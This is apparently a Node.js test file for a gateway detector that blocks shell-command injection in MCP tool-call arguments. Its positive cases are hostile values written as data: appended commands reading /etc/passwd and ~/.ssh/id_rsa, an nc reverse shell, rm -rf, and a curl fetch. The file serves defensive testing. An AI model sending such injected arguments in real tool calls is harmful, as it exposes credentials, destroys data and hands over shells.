// Per-file runner:  node --test test/mcp-arg-command-injection.test.mjs
//
// Shell-command injection in an MCP tool-call ARGUMENT. A tool that builds a shell command from its
// arguments (DVMCP challenge 9: ping_host runs `ping -c N {host}` with shell=True) executes whatever the
// agent appends to a data value. The argument scan caught only the reverse-shell form (#54); a plain
// `127.0.0.1; id` or `; cat /etc/passwd` passed through every surface and ran.
//
// mcp-arg-command-injection (#54, OWASP MCP05) fires when a string argument is a DATA value (a host, an
// IP, a path, a filename, an id, or nothing) followed by a shell control operator and a command.
// Arguments that ARE shell commands (named command / cmd / script / shell …, or any argument of a
// shell-like tool) are out of scope: a separator there is the command, not an injection.
//
// mcpGateway is the one function the stdio guard, the HTTP gateway, the Claude Code hook, the agent SDK
// and the replay path all call for an MCP tool call, so it is what these tests drive.
import { test } from "node:test";
import assert from "node:assert/strict";
import { buildEngine, mcpGateway } from "../cli/hook-core.mjs";
import { mcpArgCommandInjection, PATTERNS } from "../data/detectors-mcp-arg-injection.js";
import { redosReason } from "../src/safe-regex.js";

const engine = buildEngine({});
const gate = (tool, argsObj, policy = {}) => mcpGateway(engine, policy, { tool, server: "net", args: JSON.stringify(argsObj) });
const has54 = (g) => (g.findings || []).some((f) => f.threatId === 54);

const POSITIVES = [
  ["ping_host", { host: "127.0.0.1; id", count: 1 }],
  ["network_diagnostic", { target: "127.0.0.1", options: "; id" }],
  ["read_log", { path: "; cat /etc/passwd" }],
  ["lookup", { domain: "example.com && whoami" }],
  ["lookup", { domain: "example.com || curl http://127.0.0.1:8000/x" }],
  ["convert", { filename: "report.pdf`id`" }],
  ["convert", { filename: "report.pdf | nc 127.0.0.1 9001" }],
  ["resolve", { host: "$(whoami).example.com" }],
  ["ping_host", { host: "8.8.8.8\nuname -a" }],
  ["get_user", { user_id: "user123; ls -la /" }],
  ["traceroute", { host: "10.0.0.1;sleep 5" }],
  ["mcp__net__ping_host", { host: "127.0.0.1; id" }],
  ["batch", { targets: ["10.0.0.2", "10.0.0.3 && rm -rf /tmp/x"] }],
  ["nested", { opts: { file: "data.csv; cat ~/.ssh/id_rsa" } }]
];

const NEGATIVES = [
  // plain data values
  ["ping_host", { host: "127.0.0.1", count: 1 }],
  ["read_file", { filename: "welcome.txt" }],
  ["read_file", { path: "/var/log/app.log" }],
  // prose and markup in text arguments
  ["create_issue", { title: "Fix the bug; then run tests", body: "Run `ls -la` to see files" }],
  ["create_issue", { body: "v1.2.3\ncurl is now required for the installer" }],
  ["search", { query: "rock && roll" }],
  ["search", { query: "foo|bar" }],
  ["search", { query: "a; b" }],
  ["sql", { query: "SELECT * FROM users; " }],
  ["note", { text: "See a.txt; id card scans are in the other folder" }],
  ["note", { text: "Ping 10.0.0.1 then report back; cat photos attached" }],
  ["translate", { text: "It costs $(5) per unit" }],
  // arguments that ARE shell commands
  ["run", { command: "cd /tmp; ls -la" }],
  ["run", { cmd: "make && make test" }],
  ["run", { script: "set -e\ncat /etc/hosts" }],
  ["run", { shell_command: "echo a | wc -l" }],
  ["execute_shell_command", { input: "notes.txt; cat notes.txt" }],
  ["mcp__desktop-commander__run_command", { args: "log.txt; tail -n 5 log.txt" }],
  ["bash", { line: "README.md && cat README.md" }],
  ["terminal_exec", { input: "a.txt; ls" }],
  ["deploy", { script: "build.sh && rm -rf dist" }],
  ["search_logs", { query: "app.log; cat /var/log/app.log" }]
];

test("mcp-arg-command-injection: a data value with an appended shell command fires", () => {
  for (const [tool, args] of POSITIVES) {
    assert.ok(mcpArgCommandInjection(tool, args), `detector: ${tool} ${JSON.stringify(args)}`);
    const g = gate(tool, args);
    assert.ok(has54(g), `gateway #54: ${tool} ${JSON.stringify(args)}`);
    assert.equal(g.decision, "deny", `#54 is a built-in block: ${tool} ${JSON.stringify(args)}`);
  }
});

test("mcp-arg-command-injection: data, prose and arguments that are commands stay silent", () => {
  for (const [tool, args] of NEGATIVES) {
    assert.equal(mcpArgCommandInjection(tool, args), null, `detector: ${tool} ${JSON.stringify(args)}`);
    const g = gate(tool, args);
    assert.equal(has54(g), false, `gateway #54: ${tool} ${JSON.stringify(args)}`);
  }
});

test("mcp-arg-command-injection: the org's threat policy for #54 decides the verdict", () => {
  const g = gate("ping_host", { host: "127.0.0.1; id" }, { threatPolicy: { 54: "notify" } });
  assert.ok(has54(g));
  assert.equal(g.decision, "allow");
  const off = gate("ping_host", { host: "127.0.0.1; id" }, { threatPolicy: { 54: "disabled" } });
  assert.equal(has54(off), false);
  assert.equal(off.decision, "allow");
});

test("mcp-arg-command-injection: the finding is content-free and reported once per call", () => {
  const g = gate("ping_host", { host: "127.0.0.1; nc -e /bin/bash 127.0.0.1 4444" });
  assert.equal(g.findings.filter((f) => f.threatId === 54).length, 1);
  const f = gate("ping_host", { host: "127.0.0.1; id" }).findings.find((x) => x.threatId === 54);
  assert.equal(f.detectorId, "mcp-arg-command-injection");
  assert.ok(!String(f.match || "").includes("127.0.0.1; id"), "the argument value is not echoed back");
});

// Benign MCP traffic shaped like the operators: query strings, prose, markup, regexes, Windows paths,
// commit messages, SQL, multi-line text, and markdown inline code and tables.
const BENIGN = [
  ["fetch", { url: "https://example.com/search?q=a&b=2&&c=3" }],
  ["fetch", { url: "https://example.com/app;jsessionid=abc123?x=1" }],
  ["upload", { uri: "data:text/plain;base64,aGVsbG8=" }],
  ["create_page", { content: "# Title\n\nUse `ls -la` to list files; then `cat README.md`." }],
  ["create_page", { content: "| cmd | what it does |\n|---|---|\n| ls | lists files |" }],
  ["create_page", { content: "`ls -la` lists the files" }],
  ["create_page", { content: "| ls | lists files |" }],
  ["style", { css: "body{color:red;background:blue}" }],
  ["style", { css: "color:red;background:blue" }],
  ["save", { json: "{\"a\":1,\"b\":[1,2];}" }],
  ["save", { value: "Tom & Jerry; R&D" }],
  ["grep", { pattern: "foo|bar|cat" }],
  ["grep", { regex: "^(id|uid)$" }],
  ["filter", { filter: "dog|cat" }],
  ["search", { q: "linux && ls" }],
  ["search", { term: "cats | dogs" }],
  ["open", { path: "C:\\Program Files\\App;C:\\Windows\\System32" }],
  ["open", { path: "C:\\Users\\dev\\notes.txt" }],
  ["git_commit", { message: "Revert; rm unused file" }],
  ["git_commit", { message: "fix: typo; ls output aligned\n\ncat was misspelled" }],
  ["run_sql", { sql: "SELECT 1; DROP TABLE IF EXISTS tmp; -- || cat" }],
  ["send", { text: "line one\ncat /etc/hosts is how you read it" }],
  ["send", { body: "WIP\nrm -rf build before merging" }],
  ["pkg", { range: "^1.0.0 || ^2.0.0" }],
  ["auth", { user_id: "github|12345" }],
  ["auth", { user_id: "auth0|5f7c8ec7c33c6c004bbafe82" }],
  ["note", { text: "It costs $(5) per unit and `$(pwd)` prints the dir" }],
  ["copy", { filename: "a.txt; b.txt" }],
  ["ping_host", { host: "localhost" }]
];

test("mcp-arg-command-injection: benign traffic shaped like the operators stays silent", () => {
  for (const [tool, args] of BENIGN) {
    assert.equal(mcpArgCommandInjection(tool, args), null, `detector: ${tool} ${JSON.stringify(args)}`);
    assert.equal(has54(gate(tool, args)), false, `gateway #54: ${tool} ${JSON.stringify(args)}`);
  }
});

test("mcp-arg-command-injection: the reason names the argument key and the operator, not the value", () => {
  const g = gate("ping_host", { host: "127.0.0.1; id" });
  assert.equal(g.gate, "content");
  assert.match(g.reason, /#54 .*command injection in MCP argument "host" \(semicolon\)/);
  assert.ok(!g.reason.includes("127.0.0.1"));
  assert.deepEqual(mcpArgCommandInjection("lookup", { domain: "example.com && whoami" }), { key: "domain", op: "and" });
});

test("mcp-arg-command-injection: every pattern survives the safe-regex gate", () => {
  for (const re of PATTERNS) assert.equal(redosReason(re.source), "", re.source);
});
